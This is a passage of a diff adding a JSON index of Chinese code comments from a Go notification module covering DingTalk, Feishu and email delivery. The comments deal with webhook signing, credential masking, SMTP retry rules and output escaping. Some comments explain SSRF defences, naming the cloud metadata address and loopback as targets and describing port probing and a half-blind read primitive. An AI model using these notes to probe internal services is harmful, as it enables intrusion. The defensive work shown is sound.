@@ -1,0 +1,6638 @@
+[
+  {
+    "path": "source/enrich/enrich.go",
+    "Start": 84,
+    "End": 179,
+    "Line": 2,
+    "Text": "// in docs/资产模型与自动关联设计.md §5: an async worker pool that resolves domains"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 170,
+    "End": 276,
+    "Line": 17,
+    "Text": "// singleMsg 构造一条带引号与换行的单发消息。刻意用含 `\"` 与 `\\n` 的标题/摘要："
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 277,
+    "End": 343,
+    "Line": 18,
+    "Text": "// 这正是模板插值最容易产出的非法 JSON 的输入。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 708,
+    "End": 747,
+    "Line": 33,
+    "Text": "// batchMsg 构造一批汇总消息。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 1150,
+    "End": 1240,
+    "Line": 49,
+    "Text": "// capturePost 起一个假接收端，把收到的请求体与头回传给断言函数。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 3138,
+    "End": 3228,
+    "Line": 100,
+    "Text": "// TestDingTalkBusinessErrorIsPermanent 锁住「HTTP 200 但 errcode 非 0」的判定。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 3229,
+    "End": 3329,
+    "Line": 101,
+    "Text": "// 不检查 errcode 会把投递失败记成成功——这是各家国内 IM 平台共有的坑。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 4295,
+    "End": 4361,
+    "Line": 126,
+    "Text": "// 造一批足够长的中文汇总，必然超过 4096 字节。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 5938,
+    "End": 6016,
+    "Line": 164,
+    "Text": "// 配了 secret 就必须带加签参数，否则飞书会以 19021 拒收。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 6122,
+    "End": 6193,
+    "Line": 168,
+    "Text": "// 卡片元素里应包含一个按钮，其 url 指向漏洞详情。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 7703,
+    "End": 7776,
+    "Line": 215,
+    "Text": "// 标题与摘要来自被测目标/模型输出，是不可信内容。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 9180,
+    "End": 9270,
+    "Line": 251,
+    "Text": "// 这条是默认模板存在的意义：标题里带引号与换行时，任何朴素的"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 9272,
+    "End": 9354,
+    "Line": 252,
+    "Text": "// `\"title\": \"{{.Title}}\"` 写法都会产出非法 JSON。{{json .}} 才不会。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 9861,
+    "End": 9963,
+    "Line": 265,
+    "Text": "// 数值必须是 JSON 数字而不是字符串（json:\"...,string\" 之类的写法会踩这坑）。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 12252,
+    "End": 12325,
+    "Line": 330,
+    "Text": "// 中文主题必须 RFC 2047 编码，否则客户端显示成乱码。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 12682,
+    "End": 12733,
+    "Line": 340,
+    "Text": "// 正文是 base64，解出来应是合法 HTML。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13136,
+    "End": 13240,
+    "Line": 353,
+    "Text": "// 标题原样出现在文本位置：HTML 文本内容里的双引号是合法字符，无需转义。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13242,
+    "End": 13344,
+    "Line": 354,
+    "Text": "// 这里断言「原样保留」是为了防止将来有人误加一层引号转义，让中文引号"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13346,
+    "End": 13368,
+    "Line": 355,
+    "Text": "// 显示成 &quot;。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13497,
+    "End": 13581,
+    "Line": 361,
+    "Text": "// TestEmailEscapesStructuralInjection 覆盖邮件正文真正需要防的注入："
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13582,
+    "End": 13687,
+    "Line": 362,
+    "Text": "// 漏洞标题与摘要来自被测目标与模型输出，是不可信内容。文本位置必须转义"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 13688,
+    "End": 13794,
+    "Line": 363,
+    "Text": "// & < >（否则可以注入标签），属性位置还必须转义引号（否则可以闭合 href）。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 14371,
+    "End": 14468,
+    "Line": 383,
+    "Text": "// 回链是管理员可配的 public_base_url，本身可信度较高，但属性位置仍必须"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 14470,
+    "End": 14563,
+    "Line": 384,
+    "Text": "// 转义引号——否则一个带引号的地址会闭合 href 并注入事件处理器。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 15111,
+    "End": 15222,
+    "Line": 405,
+    "Text": "// 校验错误会直接展示给配置者，必须说清楚缺什么，而不是泛泛的「配置无效」。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 16117,
+    "End": 16191,
+    "Line": 436,
+    "Text": "// TestEmailSMTPErrorClassification 锁住 SMTP 4xx/5xx 的语义区分。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 16192,
+    "End": 16302,
+    "Line": 437,
+    "Text": "// 若把 4xx 也判成永久失败，一个启用灰名单的邮件服务器会让每条推送都在第一次"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 16303,
+    "End": 16399,
+    "Line": 438,
+    "Text": "// 尝试后落入 failed —— 而灰名单恰恰是自动重试最该发挥作用的场景。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 16794,
+    "End": 16893,
+    "Line": 450,
+    "Text": "// 取不到应答码时按「可重试」处理：宁可多试一次，也不要把可能的瞬时"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 16896,
+    "End": 16914,
+    "Line": 451,
+    "Text": "// 故障判死。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 17198,
+    "End": 17261,
+    "Line": 460,
+    "Text": "// 无论怎么分类，原文都要保留给使用者排查。"
+  },
+  {
+    "path": "source/notify/channels_test.go",
+    "Start": 17450,
+    "End": 17526,
+    "Line": 468,
+    "Text": "// 六个渠道缺一不可——少一个会在 UI 下拉里静默消失。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 161,
+    "End": 213,
+    "Line": 17,
+    "Text": "// dingTalkChannel 实现钉钉自定义机器人。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 217,
+    "End": 271,
+    "Line": 19,
+    "Text": "// 平台特性（决定了这里的实现取舍）："
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 272,
+    "End": 365,
+    "Line": 20,
+    "Text": "//   - 单机器人限流 20 条/分钟，超发会被静默丢弃（HTTP 仍可能 200），"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 366,
+    "End": 433,
+    "Line": 21,
+    "Text": "//     所以限流必须在客户端做，见 DefaultRatePerMin。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 434,
+    "End": 534,
+    "Line": 22,
+    "Text": "//   - 安全设置三选一：加签 / 自定义关键词 / IP 白名单。加签是唯一不依赖"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 535,
+    "End": 634,
+    "Line": 23,
+    "Text": "//     消息内容的方案，所以只支持加签（也支持三者都不开的裸 webhook）。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 635,
+    "End": 729,
+    "Line": 24,
+    "Text": "//   - 成功/失败都返回 HTTP 200，靠 body 里的 errcode 区分——不检查 errcode"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 730,
+    "End": 770,
+    "Line": 25,
+    "Text": "//     会把投递失败记成成功。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 926,
+    "End": 1017,
+    "Line": 32,
+    "Text": "// 钉钉的 Webhook 地址里带 access_token，本身就是凭据，因此整体掩码。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 1105,
+    "End": 1210,
+    "Line": 35,
+    "Text": "// 目标是钉钉的 Webhook 地址本身；改地址必须同时对新地址重新表态加签密钥。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 1568,
+    "End": 1674,
+    "Line": 49,
+    "Text": "// Send 投递一次消息。有回链且是单条时用 ActionCard（带按钮），否则用 markdown。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 2034,
+    "End": 2140,
+    "Line": 61,
+    "Text": "// 钉钉 markdown 正文无明确字节上限，但仍做上限保护，避免证据字段异常膨胀。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 2756,
+    "End": 2803,
+    "Line": 87,
+    "Text": "// 钉钉把业务错误藏在 200 响应里。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3059,
+    "End": 3148,
+    "Line": 96,
+    "Text": "// 301000 是签名校验失败、310000 是关键词不匹配——都是配置错误，"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3151,
+    "End": 3175,
+    "Line": 97,
+    "Text": "// 重试不会自愈。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3293,
+    "End": 3382,
+    "Line": 103,
+    "Text": "// dingTalkSignedURL 按官方加签规则给 webhook 追加 timestamp 与 sign 参数。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3386,
+    "End": 3479,
+    "Line": 105,
+    "Text": "// 规则：待签串 = timestamp + \"\\n\" + secret，HMAC-SHA256 的**密钥也是 secret**，"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3480,
+    "End": 3567,
+    "Line": 106,
+    "Text": "// 结果 base64 后 URL 编码。timestamp 是毫秒。secret 为空时原样返回，"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3568,
+    "End": 3610,
+    "Line": 107,
+    "Text": "// 以支持未开启加签的机器人。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 3963,
+    "End": 4050,
+    "Line": 119,
+    "Text": "// 不透传 err：url.Parse 的错误文本里带完整地址（含 access_token）。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4253,
+    "End": 4351,
+    "Line": 129,
+    "Text": "// validateHTTPURL 校验地址可用、协议受支持，并对字面 IP 目标做内网判断。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4355,
+    "End": 4373,
+    "Line": 131,
+    "Text": "// 两点讲究："
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4377,
+    "End": 4475,
+    "Line": 133,
+    "Text": "//  1. **错误信息必须脱敏**。url.Parse 自己返回的是 *url.Error，它的 Error() 带"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4476,
+    "End": 4581,
+    "Line": 134,
+    "Text": "//     **完整原始地址**，而本功能这几家的地址里就嵌着凭据（钉钉 access_token、"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4582,
+    "End": 4681,
+    "Line": 135,
+    "Text": "//     企微 key、Telegram 的 bot token、飞书 hook id）。曾经这里直接 `return err`，"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4682,
+    "End": 4793,
+    "Line": 136,
+    "Text": "//     于是「地址格式非法」这条错误就把凭据带了出去，流向测试接口的 400 响应、"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4794,
+    "End": 4875,
+    "Line": 137,
+    "Text": "//     每次投递落库的 last_error、服务端日志与投递历史接口。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4879,
+    "End": 4978,
+    "Line": 139,
+    "Text": "//  2. **字面 IP 直接判内网**，域名留给拨号阶段判（blockInternalDial 才是最终"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 4979,
+    "End": 5093,
+    "Line": 140,
+    "Text": "//     生效点，也能覆盖 DNS 重绑定）。这里做一次是为了让保存配置时就能得到提示，"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 5094,
+    "End": 5140,
+    "Line": 141,
+    "Text": "//     而不是等到第一次投递失败。"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 5144,
+    "End": 5241,
+    "Line": 143,
+    "Text": "// 限制协议是防御性的：file:///gopher:// 之类会让 http.Client 产生意料之外的"
+  },
+  {
+    "path": "source/notify/dingtalk.go",
+    "Start": 5242,
+    "End": 5322,
+    "Line": 144,
+    "Text": "// 行为（虽已被 scheme 检查挡下，但没有理由放开这个面）。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 146,
+    "End": 230,
+    "Line": 17,
+    "Text": "// emailDialTimeout / emailSessionTimeout 分别约束建连与整段 SMTP 会话。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 231,
+    "End": 327,
+    "Line": 18,
+    "Text": "// net/smtp 自身没有任何超时机制，不设这两道的话，一个卡住的对端会让"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 328,
+    "End": 422,
+    "Line": 19,
+    "Text": "// 投递 goroutine 永久挂在那里——而 dispatcher 是单 goroutine 串行处理的，"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 423,
+    "End": 459,
+    "Line": 20,
+    "Text": "// 等于整个通知系统停摆。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 551,
+    "End": 594,
+    "Line": 26,
+    "Text": "// emailChannel 实现 SMTP 邮件投递。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 679,
+    "End": 763,
+    "Line": 31,
+    "Text": "// 邮件没有平台限流，但不该用它刷屏；给一个宽松的默认值。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 823,
+    "End": 933,
+    "Line": 34,
+    "Text": "// 只掩码密码。SMTP 主机、账号、收件人都不算秘密，掩码它们只会让编辑变麻烦。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 1009,
+    "End": 1113,
+    "Line": 37,
+    "Text": "// host/port 决定把密码交给哪台服务器；tls 决定是否加密传输。三者任一变化都"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 1114,
+    "End": 1232,
+    "Line": 38,
+    "Text": "// 要求重新表态密码——顺带让「关掉 TLS」这一步必须显式带上凭据，而不是顺手一改。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 2463,
+    "End": 2564,
+    "Line": 82,
+    "Text": "// STARTTLS：对端支持就升级。明文会话下不能发凭据（见下面的 auth 说明）。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 2910,
+    "End": 3004,
+    "Line": 92,
+    "Text": "// smtp.PlainAuth 会拒绝在未加密连接上发送凭据（除非目标是 localhost）。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 3008,
+    "End": 3096,
+    "Line": 93,
+    "Text": "// 这是**正确**的安全行为，不能绕过，但需要把原因翻译清楚——"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 3100,
+    "End": 3185,
+    "Line": 94,
+    "Text": "// 否则使用者只会看到「unencrypted connection」而不知道该怎么办。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4090,
+    "End": 4185,
+    "Line": 119,
+    "Text": "// Quit 失败不影响「邮件已被服务器接收」这个事实，因此忽略其错误。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4206,
+    "End": 4286,
+    "Line": 121,
+    "Text": "// 邮件没有长度截断（HTML 正文全部发送），整批都算送达。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4316,
+    "End": 4350,
+    "Line": 125,
+    "Text": "// emailDial 建立 SMTP 连接。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4354,
+    "End": 4454,
+    "Line": 127,
+    "Text": "// implicitTLS=true 走 465 这类「连上即 TLS」的方式；false 走 25/587 明文建连后再"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4455,
+    "End": 4541,
+    "Line": 128,
+    "Text": "// STARTTLS。两者不能混：对 465 端口发明文 greeting 会被直接断开。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4545,
+    "End": 4648,
+    "Line": 130,
+    "Text": "// 会话期限在**建连处**就设好（而非事后补设），因为 net/smtp 的 Client 把底层"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4649,
+    "End": 4763,
+    "Line": 131,
+    "Text": "// 连接藏在未导出字段里，外部拿不到它；连接一旦交出去就只能靠预先设置的 deadline"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4764,
+    "End": 4821,
+    "Line": 132,
+    "Text": "// 兜底。这也顺带覆盖了握手阶段的阻塞。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4822,
+    "End": 4914,
+    "Line": 133,
+    "Text": "// Control 挂 blockInternalDial 与 HTTP 系渠道共用同一道守卫。不挂的话 SMTP"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 4915,
+    "End": 5011,
+    "Line": 134,
+    "Text": "// 就是整套 SSRF 防护的缺口：host 填 169.254.169.254 或 127.0.0.1 能直接连上，"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 5012,
+    "End": 5108,
+    "Line": 135,
+    "Text": "// 而 smtp.NewClient 握手失败时会把对端返回的那一行包进错误、经 last_error"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 5109,
+    "End": 5215,
+    "Line": 136,
+    "Text": "// 由投递历史接口回显，构成半盲读原语；「连接被拒 vs 超时」的耗时差异还能"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 5216,
+    "End": 5299,
+    "Line": 137,
+    "Text": "// 用来探测端口。拨号阶段是最终生效点，也覆盖 DNS 重绑定。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6000,
+    "End": 6105,
+    "Line": 159,
+    "Text": "// smtpStageError 按 SMTP 应答码把某个阶段的失败分成「可重试」与「永久失败」。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6109,
+    "End": 6181,
+    "Line": 161,
+    "Text": "// 为什么必须区分：SMTP 的 4xx 与 5xx 语义完全不同——"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6182,
+    "End": 6271,
+    "Line": 162,
+    "Text": "//   - 4xx（450 灰名单、451 本地错误、452 存储不足）是**临时**拒绝，"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6272,
+    "End": 6369,
+    "Line": 163,
+    "Text": "//     正规做法是稍后重试；尤其是灰名单，几乎每次首次投递都会遇到。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6370,
+    "End": 6463,
+    "Line": 164,
+    "Text": "//   - 5xx（550 用户不存在、553 地址非法）是永久拒绝，重试没有意义。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6467,
+    "End": 6576,
+    "Line": 166,
+    "Text": "// 若一律判永久失败，一个启用灰名单的邮件服务器会让**每一条**推送都在第一次"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6577,
+    "End": 6674,
+    "Line": 167,
+    "Text": "// 尝试后落入 failed——而这类失败恰恰是自动重试最该发挥作用的场景。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6675,
+    "End": 6780,
+    "Line": 168,
+    "Text": "// 应答码取错误文本的前三位数字；取不到码时按可重试处理（宁可多试一次，"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 6781,
+    "End": 6850,
+    "Line": 169,
+    "Text": "// 也不要因为解析不出就把可能的瞬时故障判死）。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7069,
+    "End": 7160,
+    "Line": 178,
+    "Text": "// smtpReplyCode 从 SMTP 错误文本里取前导的三位应答码，取不到返回 0。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7161,
+    "End": 7255,
+    "Line": 179,
+    "Text": "// net/smtp 不导出错误码字段，只能从文本里取；格式为「450 4.7.1 ...」。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7406,
+    "End": 7461,
+    "Line": 191,
+    "Text": "// buildEmailMessage 组装完整的 RFC 5322 邮件。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7465,
+    "End": 7565,
+    "Line": 193,
+    "Text": "// 正文用 base64 编码有两个原因：一是 SMTP 规定单行不超过 1000 字节，而 HTML"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7566,
+    "End": 7672,
+    "Line": 194,
+    "Text": "// 正文（尤其汇总邮件）很容易出现超长行；二是 base64 天然不会出现以 \".\" 开头"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7673,
+    "End": 7721,
+    "Line": 195,
+    "Text": "// 的行，省去 SMTP 点号转义的麻烦。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 7918,
+    "End": 8000,
+    "Line": 200,
+    "Text": "// 中文主题必须做 RFC 2047 编码，否则会被客户端显示成乱码。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 8245,
+    "End": 8302,
+    "Line": 205,
+    "Text": "// 邮件没有长度硬上限，因此不截断正文。"
+  },
+  {
+    "path": "source/notify/email.go",
+    "Start": 8397,
+    "End": 8447,
+    "Line": 208,
+    "Text": "// base64 按 76 字符折行，符合 RFC 2045。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 86,
+    "End": 184,
+    "Line": 13,
+    "Text": "// 本文件补齐邮件渠道的协议级测试。在此之前 email.Send 的覆盖率是 0——"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 185,
+    "End": 281,
+    "Line": 14,
+    "Text": "// 整条 SMTP 路径没有任何用例跑过，而它恰恰是六个渠道里协议面最大、"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 282,
+    "End": 380,
+    "Line": 15,
+    "Text": "// 最容易出错的一个（握手、认证、信封、DATA 阶段各有各的失败语义）。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 384,
+    "End": 465,
+    "Line": 17,
+    "Text": "// 这里用自建的最小 SMTP 服务器驱动，而不是 mock 掉 net/smtp："
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 466,
+    "End": 556,
+    "Line": 18,
+    "Text": "// 邮件渠道的绝大部分风险就在「与真实 SMTP 服务器对话」这一步，"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 557,
+    "End": 596,
+    "Line": 19,
+    "Text": "// 把这一步 mock 掉等于不测。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 598,
+    "End": 700,
+    "Line": 21,
+    "Text": "// fakeSMTP 是一个刚好够用的 SMTP 服务器：能完成 greet/EHLO/AUTH/MAIL/RCPT/DATA/QUIT，"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 701,
+    "End": 761,
+    "Line": 22,
+    "Text": "// 并按用例要求对特定阶段返回指定应答码。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 804,
+    "End": 854,
+    "Line": 26,
+    "Text": "// rcptReply 是 RCPT TO 的应答；默认 250。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 874,
+    "End": 926,
+    "Line": 28,
+    "Text": "// mailReply 是 MAIL FROM 的应答；默认 250。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 946,
+    "End": 1013,
+    "Line": 30,
+    "Text": "// advertiseAuth 为 true 时在 EHLO 里声明支持 AUTH PLAIN。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 2387,
+    "End": 2484,
+    "Line": 100,
+    "Text": "// 不声明 STARTTLS：让代码走明文分支（测试目标是信封逻辑，不是 TLS）。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 2625,
+    "End": 2697,
+    "Line": 107,
+    "Text": "// 简化处理：PLAIN 的初始应答可能跨多行，直接接受。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 3988,
+    "End": 4055,
+    "Line": 162,
+    "Text": "// 信封阶段必须走到：发件人、两个收件人、DATA。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 4312,
+    "End": 4406,
+    "Line": 168,
+    "Text": "// 正文是 base64 的 HTML，且要带上真实的漏洞内容（编码后仍可辨认）。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 4753,
+    "End": 4799,
+    "Line": 179,
+    "Text": "// 多个收件人都要出现在 To 头里。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 4971,
+    "End": 5041,
+    "Line": 186,
+    "Text": "// 未配账号时不应发 AUTH —— 有些中继会因此拒收。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 5310,
+    "End": 5387,
+    "Line": 197,
+    "Text": "// TestEmailSendClassifiesSMTPReplies 是本次审计修复的直接验证："
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 5388,
+    "End": 5446,
+    "Line": 198,
+    "Text": "// 5xx 判永久失败、4xx（灰名单）判可重试。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 6450,
+    "End": 6543,
+    "Line": 224,
+    "Text": "// 服务器原文要保留，否则用户不知道该找服务器管理员还是改地址。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 6827,
+    "End": 6923,
+    "Line": 233,
+    "Text": "// net/smtp 的 PlainAuth 拒绝在未加密连接上发凭据（除非目标是 localhost）。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 6925,
+    "End": 7025,
+    "Line": 234,
+    "Text": "// 这是**正确**的安全行为，不能被绕过；但要给出能指导用户修复的错误。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 7027,
+    "End": 7083,
+    "Line": 235,
+    "Text": "// 这里用一个非 localhost 的主机名触发它。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 7213,
+    "End": 7229,
+    "Line": 240,
+    "Text": "// 非 localhost"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 7555,
+    "End": 7660,
+    "Line": 251,
+    "Text": "// 连不上 或 被拒发凭据都算通过这条断言；关键是**不能**静默把密码发出去。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 7868,
+    "End": 7970,
+    "Line": 258,
+    "Text": "// 邮件渠道的配置字段最多，遗漏任一个都会在投递时才暴露；这里逐个确认"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 7972,
+    "End": 8056,
+    "Line": 259,
+    "Text": "// 校验能提前拦下。断言检查的是「错误信息提到了缺什么」。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 8740,
+    "End": 8827,
+    "Line": 279,
+    "Text": "// TestEmailConfigTolerance 覆盖配置读取的容错：JSONB 里数值是 float64，"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 8828,
+    "End": 8919,
+    "Line": 280,
+    "Text": "// 但用户在 UI 里可能把端口填成字符串；数组也可能是单个字符串。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 9037,
+    "End": 9064,
+    "Line": 284,
+    "Text": "// 字符串形式的端口"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 9103,
+    "End": 9133,
+    "Line": 286,
+    "Text": "// 单个字符串而非数组"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 9153,
+    "End": 9180,
+    "Line": 287,
+    "Text": "// 字符串形式的布尔"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 9627,
+    "End": 9693,
+    "Line": 303,
+    "Text": "// TestFilterValidateRejectsTypo 是审计修复的直接验证："
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 9694,
+    "End": 9784,
+    "Line": 304,
+    "Text": "// 门槛打错字必须在写入时被拦，否则过滤器会静默失效变成全推。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 10041,
+    "End": 10104,
+    "Line": 312,
+    "Text": "// 这些是真实会发生的笔误——全部必须被拒。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 10354,
+    "End": 10396,
+    "Line": 319,
+    "Text": "// 错误信息要能指导用户改对。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 10569,
+    "End": 10651,
+    "Line": 326,
+    "Text": "// TestFilterValidateIsWriteTimeOnly 锁住「写入严、读取宽」的分工："
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 10652,
+    "End": 10763,
+    "Line": 327,
+    "Text": "// 库里已有的坏值不能让渠道整个读不出来（那会让历史渠道突然全部停止推送）。"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 10884,
+    "End": 10896,
+    "Line": 330,
+    "Text": "// 不报错"
+  },
+  {
+    "path": "source/notify/email_test.go",
+    "Start": 11000,
+    "End": 11072,
+    "Line": 334,
+    "Text": "// 且该渠道仍能对事件做出判定（不 panic、不阻塞）。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 143,
+    "End": 228,
+    "Line": 15,
+    "Text": "// feishuChannel 实现飞书（含 Lark）自定义机器人，走交互式卡片。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 232,
+    "End": 250,
+    "Line": 17,
+    "Text": "// 平台特性："
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 251,
+    "End": 334,
+    "Line": 18,
+    "Text": "//   - 加签算法与钉钉**不同**，且极易写错，见 feishuSign 注释。"
+  },
+  {
+    "path": "source/notify/feishu.go",
+    "Start": 335,
+    "End": 418,
+    "Line": 19,
+    "Text": "//   - 与钉钉一样把业务错误塞在 HTTP 200 的 body 里（code != 0）。"
+  },
+  {
+    "path": "source/notify/feishu.go",
